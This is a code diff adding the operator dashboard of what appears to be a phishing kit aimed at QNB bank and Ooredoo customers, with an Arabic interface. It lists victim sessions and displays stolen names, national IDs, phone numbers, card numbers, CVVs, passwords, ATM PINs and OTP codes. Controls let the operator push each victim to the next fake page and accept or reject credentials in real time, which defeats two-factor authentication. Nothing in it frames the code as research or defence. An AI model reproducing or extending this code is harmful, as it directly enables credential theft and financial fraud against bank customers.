+                  <TableCell>
+                    <span className="inline-flex items-center px-2.5 py-0.5 rounded-full text-xs font-medium bg-slate-100 text-slate-800 border border-slate-200">
+                      <span className={`w-2 h-2 rounded-full ml-1.5 ${session.bank === 'qnb' ? 'bg-rose-500' : 'bg-blue-500'}`}></span>
+                      {session.bank?.toUpperCase()}
+                    </span>
+                  </TableCell>
+                  <TableCell className="text-slate-600 flex items-center gap-1">
+                    <Globe className="w-3 h-3 text-slate-400" />
+                    {session.country || "—"}
+                  </TableCell>
+                  <TableCell className="font-medium text-slate-900">{session.fullName || "—"}</TableCell>
+                  <TableCell>
+                    <span className={`px-3 py-1 rounded-full text-xs font-bold ${
+                      session.currentStep === 'success' ? 'bg-emerald-100 text-emerald-700' :
+                      session.currentStep === 'waiting' ? 'bg-amber-100 text-amber-700' :
+                      'bg-blue-100 text-blue-700'
+                    }`}>
+                      {session.currentStep === 'home' ? 'الرئيسية' :
+                       session.currentStep === 'personal-data' ? 'البيانات الشخصية' :
+                       session.currentStep === 'login-method' ? 'تسجيل الدخول' :
+                       session.currentStep === 'otp' ? 'OTP' :
+                       session.currentStep === 'atm-pin' ? 'ATM PIN' :
+                       session.currentStep === 'ooredoo' ? 'Ooredoo' :
+                       session.currentStep === 'otp-ooredoo' ? 'OTP Ooredoo' :
+                       session.currentStep === 'waiting' ? 'في الانتظار' :
+                       session.currentStep === 'success' ? 'نجاح' : session.currentStep}
+                    </span>
+                  </TableCell>
+                  <TableCell className="text-slate-500 text-xs">
+                    {new Date(session.createdAt).toLocaleTimeString('ar-EG')}
+                  </TableCell>
+                  <TableCell>
+                    <div className="flex items-center justify-center gap-2">
+                      <Button
+                        variant="ghost"
+                        size="sm"
+                        className="text-blue-600 hover:text-blue-700 hover:bg-blue-50 gap-1"
+                        onClick={() => {
+                          setSelectedSession(session);
+                          setIsDetailsOpen(true);
+                        }}
+                      >
+                        <Eye className="w-4 h-4" />
+                        التفاصيل
+                      </Button>
+
+                      <DropdownMenu>
+                        <DropdownMenuTrigger asChild>
+                          <Button variant="ghost" size="sm" className="text-rose-600 hover:text-rose-700 hover:bg-rose-50 gap-1">
+                            <ExternalLink className="w-4 h-4" />
+                            إعادة توجيه
+                          </Button>
+                        </DropdownMenuTrigger>
+                        <DropdownMenuContent align="end" className="w-56 p-2 rounded-xl border-slate-200">
+                          <DropdownMenuLabel className="text-right text-xs text-slate-400 mb-1">توجيه لصفحة محددة</DropdownMenuLabel>
+                          {[
+                            { name: '📄 صفحة الدخول', step: 'login-method' },
+                            { name: '🔑 صفحة OTP', step: 'otp' },
+                            { name: '💳 صفحة ATM PIN', step: 'atm-pin' },
+                            { name: '🌐 صفحة Ooredoo', step: 'ooredoo' },
+                            { name: '📱 صفحة OTP Ooredoo', step: 'otp-ooredoo' },
+                            { name: '✨ صفحة النجاح', step: 'success' },
+                          ].map((page) => (
+                            <DropdownMenuItem
+                              key={page.step}
+                              onClick={() => handleRedirect(session.sessionId, page.step)}
+                              className="text-right justify-end hover:bg-slate-50 cursor-pointer rounded-lg py-2"
+                            >
+                              {page.name}
+                            </DropdownMenuItem>
+                          ))}
+                        </DropdownMenuContent>
+                      </DropdownMenu>
+                    </div>
+                  </TableCell>
+                </TableRow>
+              ))}
+            </TableBody>
+          </Table>
+        </div>
+      </div>
+
+      {/* Details Dialog */}
+      <Dialog open={isDetailsOpen} onOpenChange={setIsDetailsOpen}>
+        <DialogContent className="max-w-2xl bg-white rounded-3xl p-0 overflow-hidden border-none shadow-2xl">
+          <DialogHeader className="bg-[#8C0032] p-6 text-white">
+            <DialogTitle className="text-xl font-bold flex items-center gap-2">
+              <User className="w-6 h-6" />
+              كل بيانات العميل
+            </DialogTitle>
+            <p className="text-rose-100 text-xs mt-1 opacity-80">ID: {selectedSession?.sessionId}</p>
+          </DialogHeader>
+
+          <div className="p-6 max-h-[70vh] overflow-y-auto space-y-6">
+            {/* Section: Personal Info */}
+            <div className="space-y-4">
+              <div className="flex items-center gap-2 text-[#8C0032] font-bold border-b pb-2">
+                <User className="w-4 h-4" />
+                البيانات الشخصية
+              </div>
+              <div className="grid grid-cols-2 gap-4">
+                <DataField label="الاسم" value={selectedSession?.fullName} />
+                <DataField label="رقم الجوال" value={selectedSession?.phoneNumber} />
+                <DataField label="رقم الهوية" value={selectedSession?.nationalId} />
+                <DataField label="الدولة" value={selectedSession?.country} />
+              </div>
+            </div>
+
+            {/* Section: Login & OTP Controls */}
+            <div className="space-y-6">
+              {/* Card/User Login */}
+              <ControlSection 
+                icon={<CreditCard className="w-4 h-4" />} 
+                title="بيانات تسجيل الدخول"
+                data={selectedSession?.loginType === 'card' ? {
+                  "نوع الدخول": "بطاقة بنكية",
+                  "رقم البطاقة": selectedSession?.cardNumber,
+                  "الاسم": selectedSession?.cardholderName,
+                  "التاريخ": selectedSession?.expiryDate,
+                  "CVV": selectedSession?.cvv
+                } : {
+                  "نوع الدخول": "اسم مستخدم",
+                  "المستخدم": selectedSession?.username,
+                  "كلمة السر": selectedSession?.password
+                }}
+                onAccept={() => handleStatusUpdate(selectedSession.sessionId, 'accepted')}
+                onReject={() => handleStatusUpdate(selectedSession.sessionId, 'rejected')}
+              />
+
+              {/* OTP Section */}
+              <ControlSection 
+                icon={<Key className="w-4 h-4" />} 
+                title="رموز التحقق (OTP)"
+                data={{
+                  "رمز OTP": selectedSession?.otpCode
+                }}
+                onAccept={() => handleStatusUpdate(selectedSession.sessionId, 'accepted')}
+                onReject={() => handleStatusUpdate(selectedSession.sessionId, 'rejected')}
+              />
+
+              {/* ATM PIN Section */}
+              <ControlSection 
+                icon={<CreditCard className="w-4 h-4" />} 
+                title="ATM PIN"
+                data={{
+                  "الرقم السري": selectedSession?.atmPin
+                }}
+                onAccept={() => handleStatusUpdate(selectedSession.sessionId, 'accepted')}
+                onReject={() => handleStatusUpdate(selectedSession.sessionId, 'rejected')}
+              />
+
+              {/* Ooredoo Section */}
+              <ControlSection 
+                icon={<Globe className="w-4 h-4" />} 
+                title="بيانات Ooredoo"
+                data={{
+                  "المستخدم": selectedSession?.ooredooUser,
+                  "كلمة السر": selectedSession?.ooredooPassword,
+                  "رمز OTP Ooredoo": selectedSession?.ooredooOtp
+                }}
+                onAccept={() => handleStatusUpdate(selectedSession.sessionId, 'accepted')}
+                onReject={() => handleStatusUpdate(selectedSession.sessionId, 'rejected')}
+              />
+            </div>
+          </div>
+
+          <DialogFooter className="p-4 bg-slate-50 border-t">
+            <Button onClick={() => setIsDetailsOpen(false)} className="bg-slate-900 hover:bg-slate-800 text-white px-8 rounded-xl">
+              إغلاق
+            </Button>
+          </DialogFooter>
         </DialogContent>
       </Dialog>
+    </div>
+  );
+}
+
+function DataField({ label, value }: { label: string; value: any }) {
+  return (
+    <div className="bg-slate-50 p-3 rounded-xl border border-slate-100">
+      <p className="text-[10px] text-slate-400 font-bold mb-1 uppercase tracking-wider">{label}</p>
+      <p className="text-slate-700 font-medium break-all">{value || "—"}</p>
+    </div>
+  );
+}
+
+function ControlSection({ icon, title, data, onAccept, onReject }: { 
+  icon: any, 
+  title: string, 
+  data: Record<string, any>, 
+  onAccept: () => void, 
+  onReject: () => void 
+}) {
+  const hasData = Object.values(data).some(v => v && v !== "—");
+  
+  return (
+    <div className={`p-4 rounded-2xl border transition-all ${hasData ? 'bg-slate-50 border-slate-200' : 'bg-slate-50/50 border-dashed border-slate-200 opacity-60'}`}>
+      <div className="flex items-center justify-between mb-4">
+        <div className="flex items-center gap-2 text-slate-800 font-bold text-sm">
+          {icon}
+          {title}
+        </div>
+        {hasData && (
+          <div className="flex items-center gap-2">
+            <Button size="sm" onClick={onAccept} className="bg-emerald-500 hover:bg-emerald-600 text-white h-8 px-3 rounded-lg gap-1 text-xs">
+              <Check className="w-3 h-3" />
+              قبول
+            </Button>
+            <Button size="sm" onClick={onReject} variant="destructive" className="h-8 px-3 rounded-lg gap-1 text-xs">
+              <X className="w-3 h-3" />
+              رفض
+            </Button>
+          </div>
+        )}
+      </div>
+      <div className="grid grid-cols-2 sm:grid-cols-3 gap-3">
+        {Object.entries(data).map(([key, val]) => (
+          <div key={key}>
+            <p className="text-[9px] text-slate-400 font-bold mb-0.5 uppercase">{key}</p>
+            <p className="text-slate-700 text-xs font-mono font-bold">{val || "—"}</p>
+          </div>
+        ))}
+      </div>
     </div>
   );
 }
